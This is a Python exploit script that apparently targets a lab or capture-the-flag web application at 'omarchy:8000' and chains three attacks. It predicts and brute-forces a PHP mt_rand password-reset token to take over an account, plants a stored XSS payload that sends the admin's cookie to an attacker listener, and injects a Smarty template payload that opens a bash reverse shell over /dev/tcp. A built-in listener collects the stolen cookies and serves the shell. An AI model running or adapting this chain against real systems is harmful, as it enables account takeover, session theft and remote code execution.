import sys, time, threading, urllib.request, urllib.parse
from email.utils import parsedate_to_datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import socket
import threading
import time
import queue
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer



class Listener:
    def __init__(self, lhost: str):
        self.lhost = lhost
        self.cookie_queue = queue.Queue()
        self._stop = threading.Event()
        self._http_server = None
        self._shell_server = None
        self.client = None
        self.http_ready = threading.Event()
        self.shell_ready = threading.Event()
        self._http_started = False
        self._shell_started = False

    class _Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            #print(f"\n[HTTP] {self.client_address[0]} → {self.path}")
            self.server.owner.cookie_queue.put(self.path)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

        def log_message(self, *args):
            pass

    def _http_loop(self, port: int):
        self._http_server = HTTPServer((self.lhost, port), self._Handler)
        self._http_server.owner = self
        self.http_ready.set()
        #print(f"[+] HTTP callback  → http://{self.lhost}:{port}")
        try:
            while not self._stop.is_set():
                self._http_server.handle_request()
        except Exception:
            pass
        finally:
            try:
                self._http_server.server_close()
            except Exception:
                pass

    def _shell_loop(self, port: int):
        self._shell_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._shell_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._shell_server.bind((self.lhost, port))
        self._shell_server.listen(1)
        self.shell_ready.set()
        print(f"[+] Shell listener → {self.lhost}:{port}")

        try:
            self.client, addr = self._shell_server.accept()
            print(f"[+] Shell from {addr[0]}:{addr[1]}")
            self._interactive()
        except OSError:
            pass

    def _interactive(self):
        def send_input():
            while not self._stop.is_set():
                try:
                    data = sys.stdin.buffer.readline()
                    if not data:
                        break
                    self.client.sendall(data)
                except (BrokenPipeError, OSError, AttributeError):
                    break

        threading.Thread(target=send_input, daemon=True).start()

        try:
            while not self._stop.is_set():
                try:
                    data = self.client.recv(4096)
                    if not data:
                        print("\n[-] Remote closed the connection")
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except OSError:
                    break
        finally:
            self.stop()

    def start(self, mode: str = "shell", http_port: int = None, shell_port: int = None):
        mode = mode.lower()
        if mode not in ("shell", "cookie", "dual"):
            raise ValueError("mode must be 'shell', 'cookie' or 'dual'")

        self._http_started = False
        self._shell_started = False

        if mode in ("cookie", "dual"):
            if http_port is None:
                raise ValueError("http_port required for cookie/dual")
            self._http_started = True
            t = threading.Thread(target=self._http_loop, args=(http_port,), daemon=True)
            t.start()

        if mode in ("shell", "dual"):
            if shell_port is None:
                raise ValueError("shell_port required for shell/dual")
            self._shell_started = True
            t = threading.Thread(target=self._shell_loop, args=(shell_port,), daemon=True)
            t.start()

    def wait_ready(self, timeout: float = 5.0) -> bool:
        results = []
        if self._http_started:
            results.append(self.http_ready.wait(timeout))
        if self._shell_started:
            results.append(self.shell_ready.wait(timeout))
        return all(results) if results else True

    def get_cookie(self, timeout: float = 60.0) -> str | None:
        try:
            return self.cookie_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def stop(self):
        self._stop.set()
        if self.client:
            try:
                self.client.close()
            except Exception:
                pass
        if self._shell_server:
            try:
                self._shell_server.close()
            except Exception:
                pass



def reset_pass(username,newpass):
    SENT_MARKER, SUCCESS_MARKER = "Email sent!", "Password changed!"
    WORKERS = 40
    CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
    _N, _M, _A, _U, _L = 624, 397, 0x9908b0df, 0x80000000, 0x7fffffff
    target = 'http://omarchy:8000'
    def php_token(seed):
        s = [0]*_N
        s[0] = seed & 0xffffffff
        for i in range(1, _N):
            s[i] = (1812433253*(s[i-1] ^ (s[i-1] >> 30)) + i) & 0xffffffff
        for i in range(_N-_M):
            s[i] = (s[i+_M] ^ (((s[i]&_U)|(s[i+1]&_L))>>1) ^ ((0xffffffff*(s[i+1]&1))&_A)) & 0xffffffff
        for i in range(_N-_M, _N-1):
            s[i] = (s[i+_M-_N] ^ (((s[i]&_U)|(s[i+1]&_L))>>1) ^ ((0xffffffff*(s[i+1]&1))&_A)) & 0xffffffff
        s[_N-1] = (s[_M-1] ^ (((s[_N-1]&_U)|(s[0]&_L))>>1) ^ ((0xffffffff*(s[0]&1))&_A)) & 0xffffffff
        out = []
        for k in range(32):
            y = s[k]
            y ^= y >> 11
            y ^= (y << 7) & 0x9d2c5680
            y ^= (y << 15) & 0xefc60000
            y ^= y >> 18
            out.append(CHARS[(y & 0xffffffff) % 63])
        return ''.join(out)

    def post(url, data, timeout=25):
        body = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode(errors="ignore"), r.headers


    ts_lo = int(time.time()*1000)
    html, hdrs = post(f"{target}/forgotpassword.php", {"username": username})
    ts_hi = int(time.time()*1000)
    if SENT_MARKER not in html:
        print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin excluded).")
        sys.exit(1)

    srv_ms = int(parsedate_to_datetime(hdrs["Date"]).timestamp()*1000)
    dur = ts_hi - ts_lo
    anchor = srv_ms + dur

    client = list(range(ts_lo, ts_hi+1))[::-1]
    seen = set(client)
    date = [s for s in range(anchor-300, anchor+1300) if s not in seen]
    seeds = client + date
    print(f"[*] Reset for {username} | client window {dur}ms | server-anchored +{len(date)} | {len(seeds)} candidates")

    tokens = [php_token(s) for s in seeds]

    found = threading.Event(); state = {"tok": None, "done": 0}; lock = threading.Lock()
    def try_token(tok):
        if found.is_set(): return
        try:
            html, _ = post(f"{target}/resetpassword.php",
                           {"token": tok, "password1": newpass, "password2": newpass})
        except Exception:
            return
        with lock:
            state["done"] += 1
            if SUCCESS_MARKER in html and not found.is_set():
                state["tok"] = tok; found.set()
            if state["done"] % 25 == 0 and not found.is_set():
                sys.stdout.write(f"\r[*] tried {state['done']}/{len(tokens)}   ")
                sys.stdout.flush()

    start = time.time()
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(try_token, t) for t in tokens]
        for _ in as_completed(futs):
            if found.is_set():
                break
        ex.shutdown(wait=False, cancel_futures=True)
    el = time.time() - start
    print()
    if found.is_set():
        print(f"[+] SUCCESS in {el:.1f}s -- {username}'s password is now '{newpass}'")
        print(f"[+] Winning token: {state['tok']}")
    else:
        print(f"[-] FAILED in {el:.1f}s -- token not in window. Widen the date range or raise WORKERS.")


def xss_exploit(username,newpass,lhost,http_port):
    url_login = 'http://omarchy:8000/login.php'
    url_exploit = 'http://omarchy:8000/profile.php'
    data_login = {"username": username ,
                      "password": newpass}
    payload = f'Head of Security - TEST <script>fetch("http://{lhost}:{http_port}?cookie=" + document.cookie)</script>'
    data_exploit = {"description": payload}
    with requests.Session() as session:
        print("Attempting login...")
        login_req = session.post(url_login, data=data_login)
        if login_req.status_code == 200:
            print("Login successful!")
            print("Captured Cookies:", session.cookies.get_dict())
            print("\nExploit XSS...")
            xss_req = session.post(url_exploit,data_exploit)
            if xss_req.status_code == 200:
                print("exploit sent successful!")

def ssti_exploit(lhost,shell_port):
    exploit_url = "http://omarchy:8000/admin/update_motd.php"
    try:
        payload = (f"{{php}}system(\"setsid bash -c 'bash -i >& /dev/tcp/{lhost}/{shell_port} 0>&1' 2>/dev/null &\");{{/php}}")

        r = requests.post(
            exploit_url,
            data={"message": payload},
            headers={"Cookie": ADMIN_COOKIE},
            timeout=10,
        )
        ok = "Message set!" in r.text

        ok = r.status_code == 200
        print(f"[{'+' if ok else '-'}] Payload status {r.status_code} "
              f"({'MoTD set' if ok else 'no Success marker'})")
        return ok
        requests.get(
            "http://omarchy:8000/index.php",
            headers={"Cookie": ADMIN_COOKIE},
            timeout=10,
            )       
    except Exception as e:
        print(f"[-] Send Payload failed: {e}")
        return False


def main():
    global ADMIN_COOKIE
    if len(sys.argv) < 4:
        print(f"Usage:")
        print(f"  python3 {sys.argv[0]} <lhost> <usename> <newpass>")
        print()
        sys.exit(1)

    lhost = sys.argv[1]
    username = sys.argv[2]
    newpass = sys.argv[3]
    mode  = "dual"
    
    http_port  = 8080
    shell_port = 9090

    
        # ---- Start listener ----
    listener = Listener(lhost)
    listener.start(mode=mode, http_port=http_port, shell_port=shell_port)
    
    if not listener.wait_ready(timeout=5):
        print("[-] Failed to bind listener(s)")
        sys.exit(1)
    
    try:
        reset_pass(username,newpass)

        xss_exploit(username,newpass,lhost,http_port)

        if mode in ("cookie", "dual"):
            print("[*] Waiting for XSS cookie... (Ctrl+C to stop)")
            while True:
                raw = listener.get_cookie(timeout=1)
                if not raw:
                    continue
                if "cookie=" not in raw:
                    continue
                cookie = raw.split("cookie=", 1)[1]
                ADMIN_COOKIE = cookie
                print(ADMIN_COOKIE)
                print(f"\n[+] Cookie: {cookie}")
                r = requests.get("http://omarchy:8000/index.php",headers={"Cookie": ADMIN_COOKIE},
                    timeout=10)
                if "Logged in as" in r.text and ">admin<" in r.text and "[Admin Section]" in r.text:
                    print("[+] admin cookie")
                    break

        
        
        if mode in ("shell", "dual"):
            print("[*] Waiting for reverse shell... (Ctrl+C to stop)")
            ssti_exploit(lhost,shell_port)
            while True:
                time.sleep(1)

            
    
            
    
    except KeyboardInterrupt:
        print("\n[*] Shutting down")
    finally:
        listener.stop()


if __name__ == "__main__":
    main()

